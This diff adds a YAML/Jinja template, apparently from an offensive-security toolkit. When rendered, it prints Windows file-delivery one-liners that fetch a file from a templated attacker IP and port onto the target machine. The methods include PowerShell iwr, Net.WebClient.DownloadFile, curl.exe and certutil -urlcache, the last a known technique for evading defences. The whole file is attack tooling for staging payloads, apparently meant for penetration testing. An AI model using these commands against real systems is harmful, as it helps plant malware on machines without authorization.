@@ -1,0 +1,23 @@
+---
+metadata:
+  filename: "download-windows.yaml"
+  tags: ["utils", "windows", "web"]
+  created: "2026-11-25"
+  authors: ["TIVKU"]
+
+content: |
+  {% if filename -%}
+  {% set label = filename if (dest is not defined or not dest or dest == filename) else filename ~ ' -> ' ~ dest -%}
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' 'Deliver: {{ label }}'; \
+  {% endif -%}
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/{{ filename }} -Outfile {{ delivery_path_windows }}\{{ dest | default(filename, true) }}'; \
+  printf '%s\n' 'Deliver: (New-Object Net.WebClient).DownloadFile("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/{{ filename }}","{{ delivery_path_windows }}\{{ dest | default(filename, true) }}")'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                  -----CMD / Native binaries-----                '; \
+  printf '%s\n' 'Deliver: powershell.exe wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/{{ filename }} -Outfile {{ delivery_path_windows }}\{{ dest | default(filename, true) }}'; \
+  printf '%s\n' 'Deliver: curl.exe http://{{ attacker_ip }}:{{ delivery_outbound_port }}/{{ filename }} -o {{ delivery_path_windows }}\{{ dest | default(filename, true) }}'; \
+  printf '%s\n' 'Deliver: certutil.exe -urlcache -split -f "http://{{ attacker_ip }}:{{ delivery_outbound_port }}/{{ filename }}" {{ delivery_path_windows }}\{{ dest | default(filename, true) }}'; \
+  printf '%s\n' '================================================================';
